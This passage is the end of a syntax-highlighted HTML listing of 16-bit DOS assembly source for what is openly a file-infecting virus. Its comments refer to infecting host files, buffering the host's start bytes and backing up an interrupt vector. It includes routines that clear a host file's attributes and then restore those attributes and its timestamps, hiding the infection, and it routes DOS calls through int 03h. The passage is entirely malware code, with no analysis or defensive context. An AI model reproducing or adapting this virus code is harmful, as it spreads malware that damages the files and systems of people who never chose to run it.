        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                   </span><span class="sc1">;cl0se file.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setattr</span><span class="sc0">                   </span><span class="sc1">;rest0re file attributes.</span><span class="sc0">

</span><span class="sc5">off</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;trace m0de 0ff.</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">nocall</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±± Get Ret Address Fr0m Stack ±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">getret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">                    </span><span class="sc1">;get next instructi0n dir.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±± S0me File Handling C0de ±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">chgattr</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">path</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                  </span><span class="sc1">;change file attributes.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">attrib</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;reset file atributes.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">setattr</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">attrib</span><span class="sc0">                </span><span class="sc1">;rest0re file attributes.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getdate</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                  </span><span class="sc1">;get file time &amp; date.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">time</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">date</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">setdate</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">time</span><span class="sc0">                   </span><span class="sc1">;rest0re file time &amp; date.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">virend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;±±±±±±±±±±±±±±±±±±±±±±±±±±±±± Virtual Data ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±</span><span class="sc0">

</span><span class="sc5">firstb</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;buffer f0r h0st start.</span><span class="sc0">
</span><span class="sc5">lstdsp</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;last trace 0ffset.</span><span class="sc0">
</span><span class="sc5">numinstr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;max. number 0f instructi0ns t0 trace.</span><span class="sc0">
</span><span class="sc5">numcall</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;call t0 infect (2-5).</span><span class="sc0">
</span><span class="sc5">intcddes</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;int CD vect0r backup.</span><span class="sc0">
</span><span class="sc5">intcdseg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hostsize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;it's just the h0st size ;)</span><span class="sc0">
</span><span class="sc5">attrib</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;file attributes.</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;file time.</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;file date.</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;check f0r compressed file.</span><span class="sc0">
</span><span class="sc5">path</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;path to host.</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
